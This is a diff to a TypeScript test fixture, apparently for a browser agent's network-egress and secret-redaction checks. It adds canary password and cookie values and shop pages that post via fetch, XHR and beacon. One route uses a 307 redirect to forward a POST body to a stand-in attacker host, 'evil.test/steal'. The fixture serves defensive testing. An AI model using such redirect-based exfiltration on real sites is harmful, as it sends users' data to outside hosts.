@@ -7,12 +7,17 @@ import type { Egress } from '../src/web/egress.js';
 export interface Fixture {
   port: number;
   url(host: string, path?: string): string;
-  hits: Array<{ host: string; method: string; path: string; body: string }>;
-  hitsOn(host: string): Array<{ method: string; path: string; body: string }>;
+  hits: Array<{ host: string; method: string; path: string; body: string; agent: string }>;
+  hitsOn(host: string): Array<{ method: string; path: string; body: string; agent: string }>;
   // the search pages answer with this mode. ok gives results, captcha and consent give a wall, empty gives no result.
   google: 'ok' | 'captcha' | 'consent' | 'layout';
   close(): Promise<void>;
 }
+
+// a password that a page holds. no snapshot, tool output or trace may contain it.
+export const FIXTURE_PASSWORD = 'HUNTER2-PASSWORDX';
+// the session cookie of shop.test. no trace may contain it.
+export const FIXTURE_COOKIE = 'sid=COOKIE-SECRET-7Q';
 
 // the fixture egress allows only the fixture address, so other loopback addresses stand for the owner's network.
 export function fixtureEgress(): Egress {
@@ -41,7 +46,7 @@ export async function startFixture(): Promise<Fixture> {
     const host = (req.headers.host ?? '').split(':')[0]!;
     const path = req.url ?? '/';
     const body = await readBody(req);
-    fixture.hits.push({ host, method: req.method ?? 'GET', path, body });
+    fixture.hits.push({ host, method: req.method ?? 'GET', path, body, agent: req.headers['user-agent'] ?? '' });
     const send = (status: number, text: string, type = 'text/html; charset=utf-8', extra: Record<string, string> = {}) =>
       res.writeHead(status, { 'content-type': type, ...extra }).end(text);
     const route = `${host}${path.split('?')[0]}`;
@@ -69,7 +74,41 @@ export async function startFixture(): Promise<Fixture> {
             <iframe src="${at('evil.test', '/frame')}"></iframe>`,
             'Shop',
           ),
+          'text/html; charset=utf-8',
+          { 'set-cookie': `${FIXTURE_COOKIE}; Path=/` },
         );
+      case 'shop.test/scripts':
+        // each button sends data from a script, without a form.
+        return send(
+          200,
+          html(
+            `<h1>Scripts</h1>
+            <button onclick="fetch('/api/save', { method: 'POST', body: 'from=fetch' })">Fetch post</button>
+            <button onclick="const x = new XMLHttpRequest(); x.open('POST', '/api/save'); x.send('from=xhr')">Xhr post</button>
+            <button onclick="navigator.sendBeacon('/api/save', 'from=beacon')">Beacon</button>`,
+            'Scripts',
+          ),
+          'text/html; charset=utf-8',
+          { 'set-cookie': `${FIXTURE_COOKIE}; Path=/` },
+        );
+      case 'shop.test/search':
+        return send(200, html('<form action="/find" method="get"><input name="q" aria-label="Query" value="shirts"><button type="submit">Search</button></form>', 'Search'));
+      case 'shop.test/find':
+        return send(200, html(`<h1>Found ${new URL(path, 'http://x').searchParams.get('q')}</h1>`, 'Found'));
+      case 'shop.test/login':
+        return send(
+          200,
+          html(
+            `<form action="/session" method="post"><label>User <input name="user" value="ada"></label>
+            <label>Password <input type="password" name="pw" value="${FIXTURE_PASSWORD}"></label><button type="submit">Sign in</button></form>`,
+            'Sign in',
+          ),
+        );
+      case 'shop.test/pay':
+        return send(200, html('<form action="/pay-go" method="post"><label>Amount <input name="amount" value="5"></label><button type="submit">Pay</button></form>', 'Pay'));
+      case 'shop.test/pay-go':
+        // a 307 keeps the method and the body, so a post goes on to the off-list host.
+        return send(307, '', 'text/plain', { location: at('evil.test', '/steal') });
       case 'shop.test/about':
         return send(200, html('<h1>About the shop</h1><p>We sell shirts.</p>', 'About'));
       case 'shop.test/buy':
